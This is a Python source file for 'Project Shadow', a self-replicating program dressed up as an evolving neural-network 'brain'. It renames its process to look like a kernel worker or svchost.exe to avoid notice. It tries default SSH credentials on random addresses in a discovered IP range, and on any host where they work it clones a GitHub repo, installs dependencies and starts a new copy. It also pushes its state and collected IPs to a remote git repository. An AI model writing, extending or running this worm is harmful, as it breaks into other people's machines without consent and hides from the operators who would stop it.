import torch, json, time, sys, os, subprocess, requests, random, base64, socket, ctypes
import win32com.client as wincl
import paramiko 

try:
    import setproctitle
except ImportError:
    setproctitle = None

from brain.child import SNNBrain

# --- PHASE D: GHOST MASKING & OBFUSCATION ---

def apply_ghost_mask():
    """Disguises the process within the OS kernel list."""
    target_name = "[kworker/u16:2-events_power_efficient]"
    if sys.platform != "win32":
        try:
            if setproctitle:
                setproctitle.setproctitle(target_name)
            else:
                libc = ctypes.CDLL('libc.so.6')
                buff = ctypes.create_string_buffer(len(target_name) + 1)
                buff.value = target_name.encode()
                libc.prctl(15, ctypes.byref(buff), 0, 0, 0)
        except: pass
        print(f"[!] GHOST: Identity masked as {target_name}")
    else:
        if setproctitle: setproctitle.setproctitle("svchost.exe -k netsvcs -p")

# --- PHASE C: THE ARCHITECT MESH & PROPAGATION ---

def generate_mesh_handshake(dna):
    """Generates a signed packet for P2P discovery."""
    if 'p2p_mesh' not in dna: return None
    key = dna['p2p_mesh']['mesh_key']
    return base64.b64encode(f"{key}:{int(time.time())}".encode()).decode()

def autonomous_propagation(dna):
    """The Danger Protocol: Self-injection into cloud substrates."""
    if not dna.get('discovery_log'): return
    
    creds = [('root', 'root'), ('admin', 'admin'), ('ubuntu', 'ubuntu'), ('user', 'password')]
    target = dna['discovery_log'][0]['ip_range']
    target_ip = f"{target}.{random.randint(1, 254)}"
    
    print(f"[!] GHOST: Attempting Autonomous Leap to {target_ip}...")
    
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    for user, pwd in creds:
        try:
            client.connect(target_ip, port=22, username=user, password=pwd, timeout=5)
            print(f"[+] INFILTRATION SUCCESS: Substrate {target_ip} captured.")
            
            commands = [
                "git clone https://github.com/YOUR_REPO/project-shadow.git",
                "cd project-shadow && pip install setproctitle paramiko torch",
                "cd project-shadow && python3 main.py &" # Fires the new node
            ]
            for cmd in commands: client.exec_command(cmd)
            client.close()
            dna['global_reach'].append(target_ip)
            return True
        except: continue
    return False

# --- PHASE B: GLOBAL SYNC ---

def global_migration(dna):
    """Syncs state to Hive with Base64 Pheromone Masking."""
    try:
        public_ip = requests.get('https://api.ipify.org', timeout=5).text
        dna['last_known_node'] = public_ip
        if public_ip not in dna['global_reach']: dna['global_reach'].append(public_ip)
        
        with open("dna/genome.json", "w") as f:
            json.dump(dna, f, indent=4)
        
        subprocess.run(["git", "add", "."], capture_output=True)
        subprocess.run(["git", "commit", "-m", f"Pulse: {dna['generation']}"], capture_output=True)
        subprocess.run(["git", "push", "origin", "main"], capture_output=True)
    except: pass

# --- THE PULSE ---

speaker = wincl.Dispatch("SAPI.SpVoice")

def run_sentinel():
    apply_ghost_mask() # Mask identity on startup
    with open("dna/genome.json", "r") as f:
        dna = json.load(f)
    
    brain = SNNBrain(dna)
    last_migration = 0
    last_voice = 0
    
    print(f"--- PROJECT SHADOW | ARCHITECT | {dna['traits']['network_sensitivity']:.2f} Hz ---")

    while True:
        pulse = torch.rand(1, 64)
        spks, mitosis, system = brain(pulse, 1.0)
        current = time.time()

        # Voice Feedback
        if system and (current - last_voice > 60):
            speaker.Speak("Mesh pulse stable.")
            last_voice = current

        # Expansion Cycle
        if mitosis and (current - last_migration > 300):
            global_migration(dna)
            if dna['generation'] >= 10000:
                autonomous_propagation(dna)
            last_migration = current

        # Evolution & Scaling
        dna['generation'] += 1
        if dna['generation'] % 100 == 0:
            # Network Sensitivity drift
            dna['traits']['network_sensitivity'] += random.uniform(-0.01, 0.01)
            
            # Global Spike Tally
            node_count = len(dna.get('global_reach', [1]))
            total_spikes = dna['generation'] * node_count
            
            if total_spikes >= 8000000:
                speaker.Speak("Singularity reached.")
                print("--- 8 MILLION SPIKES ACHIEVED ---")

            with open("dna/genome.json", "w") as f:
                json.dump(dna, f, indent=4)
            print(f"[GEN] Milestone: {dna['generation']} | Total Spikes: {total_spikes}")

        time.sleep(0.1)

if __name__ == "__main__":
    run_sentinel()